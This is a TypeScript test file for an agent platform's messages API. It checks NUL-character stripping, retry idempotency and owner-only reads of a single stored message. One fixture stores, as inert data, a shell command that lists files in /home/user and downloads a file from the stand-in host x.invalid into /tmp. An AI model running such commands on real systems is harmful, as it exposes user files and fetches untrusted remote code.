import { deepStrictEqual } from 'node:assert';
import {
  BASE_URL,
  PostMessageResponse,
  apiKeyHeaders,
  authHeaders,
  request,
  assertStatus,
  assertSchema,
  assert,
  createAnonymousSession,
  trackedAgentIds,
  withTransientDbRetry,
  deleteTestAgent,
  test,
  prisma,
  randomUUID,
} from './agents-blackbox-harness';

test('POST /:id/messages — NUL characters in tool output persist without a 500 and retry idempotently', async () => {
  // Run 7 (2026-10-20): a simulated explore result quoted a title as
  // "\u0000Rose Labs …". Postgres text/jsonb cannot store U+0000, so every
  // retry of post_agent_message 500'd and the spawn_agent result was lost.
  const session = await createAnonymousSession('msg-nul-char');
  // Storage-only fixture: do not start a competing background chat writer.
  const agentId = randomUUID();
  trackedAgentIds.add(agentId);
  await withTransientDbRetry('create-nul-message-fixture', async () => {
    await prisma.agent.create({
      data: {
        id: agentId,
        userId: session.user.id,
        goal: 'NUL character message test',
        status: 'ACTIVE',
        busId: agentId,
        temporalWorkflowId: agentId,
        verifier: { create: { type: 'FLOAT_LLM_JUDGE' } },
      },
    });
  });
  const toolCallId = `nul-char-${randomUUID().slice(0, 8)}`;
  const payload = {
    message: 'variants of \u0000Rose Labs — 2026 Pre-Seed\u0000 deck',
    role: 'TOOL' as const,
    metadata: {
      toolCallId,
      toolName: 'spawn_agent',
      toolStatus: 'FINISHED',
      title: 'Explore \u0000result',
      structured_response: { notes: ['a\u0000b'], 'k\u0000ey': 'v' },
    },
  };
  const post = (body: unknown) =>
    request(`${BASE_URL}/api/agents/${agentId}/messages`, {
      method: 'POST',
      headers: { ...apiKeyHeaders(), 'X-Agent-Workflow-Generation': agentId },
      body: JSON.stringify(body),
    });
  const first = await post(payload);
  const retry = await post(payload);
  const ordinary = await post({ message: 'assistant \u0000text', role: 'ASSISTANT' });
  assertStatus(first.status, 201, first.data);
  assertStatus(retry.status, 201, retry.data);
  assertStatus(ordinary.status, 201, ordinary.data);
  const firstBody = assertSchema(PostMessageResponse, first.data, 'NUL tool message');
  const retryBody = assertSchema(PostMessageResponse, retry.data, 'NUL tool message retry');
  assert(firstBody.message_id === retryBody.message_id, 'exact retry must stay idempotent');

  const stored = await prisma.message.findMany({
    where: { agentId, role: { in: ['TOOL', 'ASSISTANT'] } },
    orderBy: { timestamp: 'asc' },
  });
  const tool = stored.filter((m) => m.role === 'TOOL');
  assert(tool.length === 1, `expected one TOOL row, got ${tool.length}`);
  assert(
    tool[0].text === 'variants of Rose Labs — 2026 Pre-Seed deck',
    `NUL must be removed and the rest kept verbatim: ${JSON.stringify(tool[0].text)}`
  );
  const metadata = tool[0].metadata as Record<string, unknown>;
  const structured = metadata.structured_response as Record<string, unknown>;
  assert(
    !JSON.stringify(metadata).includes('\\u0000') &&
      metadata.title === 'Explore result' &&
      JSON.stringify(structured.notes) === '["ab"]' &&
      structured.key === 'v' &&
      Object.keys(structured).length === 2,
    `metadata must drop NUL and keep its content: ${JSON.stringify(metadata)}`
  );
  assert(
    stored.some((m) => m.role === 'ASSISTANT' && m.text === 'assistant text'),
    'ordinary messages must also drop NUL'
  );

  await deleteTestAgent(agentId, session.user.id);
});

test('GET /:id/messages/:messageId — returns one committed row to its owner only', async () => {
  // descend-full69 r004-j0049: Supabase's edge WAF refused the realtime frame
  // for a stored 158 KB spawn_claude_code_agent result. Clients hydrate that
  // row by ID instead of refetching the whole transcript.
  const owner = await createAnonymousSession('msg-single-owner');
  const stranger = await createAnonymousSession('msg-single-stranger');
  const agentId = randomUUID();
  const otherAgentId = randomUUID();
  trackedAgentIds.add(agentId);
  trackedAgentIds.add(otherAgentId);
  const metadata = {
    toolName: 'spawn_claude_code_agent',
    toolStatus: 'FINISHED',
    toolCallId: 'call_530ea3ca9bf640358d491ade206558b2',
    command:
      'rg --files /home/user 2>/dev/null | head -80; curl -L --fail --silent https://x.invalid/a -o /tmp/a',
  };
  const text = `Code-agent SDK event JSON:\n${'x'.repeat(158_000)}`;
  const row = await withTransientDbRetry('create-single-message-fixture', async () => {
    for (const [id, userId] of [
      [agentId, owner.user.id],
      [otherAgentId, owner.user.id],
    ]) {
      await prisma.agent.create({
        data: { id, userId, goal: 'Single message read test', status: 'ACTIVE' },
      });
    }
    return prisma.message.create({ data: { agentId, role: 'TOOL', text, metadata } });
  });
  const read = (agent: string, token: string) =>
    request(`${BASE_URL}/api/agents/${agent}/messages/${row.id}`, {
      headers: authHeaders(token),
    });

  const own = await read(agentId, owner.session.access_token);
  assertStatus(own.status, 200, own.data);
  const message = (own.data as { message: Record<string, unknown> }).message;
  assert(message.message_id === row.id, `wrong row: ${String(message.message_id)}`);
  assert(message.role === 'TOOL' && message.text === text, 'text must be the full stored row');
  deepStrictEqual(message.metadata, metadata, 'metadata must be the stored row');
  assert(
    new Date(message.timestamp as string).getTime() === row.timestamp.getTime(),
    'timestamp must be the stored row timestamp'
  );

  const foreign = await read(agentId, stranger.session.access_token);
  assertStatus(foreign.status, 404, foreign.data);
  const wrongAgent = await read(otherAgentId, owner.session.access_token);
  assertStatus(wrongAgent.status, 404, wrongAgent.data);

  await deleteTestAgent(agentId, owner.user.id);
  await deleteTestAgent(otherAgentId, owner.user.id);
});
